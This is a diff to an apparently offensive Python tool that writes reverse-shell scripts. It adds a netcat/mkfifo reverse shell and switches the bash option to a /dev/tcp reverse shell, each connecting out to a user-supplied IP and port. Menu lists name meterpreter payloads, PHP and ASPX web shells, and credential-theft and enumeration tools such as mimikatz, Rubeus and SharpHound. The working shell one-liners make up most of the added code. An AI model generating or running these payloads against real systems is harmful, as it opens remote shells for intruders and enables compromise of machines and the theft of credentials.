@@ -195,12 +195,17 @@ def info(type, path, command, ip ,port):
     print(Fore.RED + "[+] Your "+str(type)+" reverse shell has been created and saved to your working directory !")       
     write_to_file(path, command)    
 
+def nc(ip, port): 
+    output_file_name = "nc_rev_shell_"+str(port)+".sh"
+    save_path = str(current_path)+"/"+output_file_name         
+    command = "#!/bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "+str(ip)+" "+str(port)+" >/tmp/f\n"
+    info("nc", save_path, command, ip, port)
+
 def bash(ip, port): 
     output_file_name = "bash_rev_shell_"+str(port)+".sh"
     save_path = str(current_path)+"/"+output_file_name         
-    command = "#!/bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "+str(ip)+" "+str(port)+" >/tmp/f\n"
+    command = "#!/bin/bash\nbash -i >& /dev/tcp/"+str(ip)+"/"+str(port)+" 0>&1\n"
     info("bash", save_path, command, ip, port)
-
 
 def perl(ip, port):
     output_file_name = "perl_rev_shell_"+str(port)+".pl"
@@ -402,7 +407,7 @@ os_list = ["Windows","Linux","magic bytes reverse shell for linux","AES 256 mode
 main_list_windows = ["generate shell","enum tools","windows tools"]
 main_list_linux = ["generate shell","tools and enumeration scripts"]
 windows_shells = ["nishang shell","windows/exec","windows/x64/exec","windows/meterpreter/reverse_tcp","windows/x64/meterpreter/reverse_tcp","php cmd web shell","aspx cmd web shell"]
-linux_shell = ["bash","simple php","full php","python","perl","rce shell","ruby","java","linux/x86/meterpreter/reverse_tcp"]
+linux_shell = ["bash","nc","simple php","full php","python","perl","rce shell","ruby","java","linux/x86/meterpreter/reverse_tcp"]
 linux_tools = ["LinEnum.sh","linpeas.sh","lse.sh","nc","pspy64","pwncat"]
 windows_enum = ["jaws.ps1","PowerUp.ps1","Sherlock.ps1","winPEAS.bat","wp.exe"]
 windows_tools =["accesschk.exe","curl.exe","nc.exe","powerview.ps1","wget.exe","base64.exe","dumpcap.exe","powercat.ps1","procdump64.exe","chisel86.exe","juicy.exe","powermad.ps1","Rubeus.exe","cmd.exe","mimikatz64.exe","powershell.exe","SharpHound.exe"]
@@ -522,6 +527,8 @@ elif os_item == "Linux":
         linux_item = select_item(linux_shell, linux_shell_size)
         if linux_item == "bash":
             bash(ip, port)
+        elif linux_item == "nc":
+            nc(ip, port)            
         elif linux_item == "simple php":
             simple_php(ip, port,"")
         elif linux_item == "full php":
